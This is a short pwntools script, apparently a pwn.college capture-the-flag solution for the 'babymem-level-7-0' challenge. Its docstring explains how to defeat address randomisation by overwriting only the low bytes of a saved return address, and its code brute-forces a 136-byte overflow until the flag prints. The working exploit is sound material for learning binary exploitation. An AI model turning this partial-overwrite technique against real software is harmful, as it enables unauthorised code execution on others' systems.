'''
Overwriting the entire return address is fine when we know
the whole address, but here, we only really know the last three nibbles.
These nibbles never change, because pages are aligned to 0x1000.
This gives us a workaround: we can overwrite the least significant byte
of the saved return address, which we can know from debugging the binary,
to retarget the return to main to any instruction that shares the other 7 bytes.
Since that last byte will be constant between executions (due to page alignment),
this will always work.
If the address we want to redirect execution to is a bit farther away from
the saved return address, and we need to write two bytes, then one of those
nibbles (the fourth least-significant one) will be a guess, and it will be
incorrect 15 of 16 times.
'''
from pwn import *

while True:
    p = process('/challenge/babymem-level-7-0')

    p.recvuntil('Payload size:')
    p.sendline(b'200')

    payload = b'a' * 136 + p16(0x1fd2)

    #p.recvline('Send your payload')
    p.send(payload)

    #p.interactive()
    str = p.recvall(1)
    if str.find(b'pwn.college{') != -1:
        print(str)
        break
